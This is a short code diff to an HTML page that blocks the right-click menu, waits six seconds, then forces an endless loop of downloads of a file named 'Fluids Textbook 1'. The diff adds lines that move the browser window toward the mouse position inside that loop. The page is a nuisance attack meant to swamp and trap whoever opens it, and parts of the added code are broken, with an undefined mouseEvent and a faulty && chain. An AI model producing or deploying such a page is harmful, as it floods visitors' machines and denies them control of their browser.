@@ -2,6 +2,8 @@
 <body oncontextmenu="return false;">
 <a href="" id="downlink" style="display:none" download="">a</a>
 <script>
+ xpos = mouseEvent.screenX;
+ ypos = mouseEvent.screenY;
   function sleep(milliseconds) {
   const date = Date.now();
   let currentDate = null;
@@ -19,6 +21,7 @@
   sleep(6000)
  
     for (;;) {
+      window.moveTo(xpos+10,ypos+10)&&
       download("./Fluids Textbook 1")
       }
   
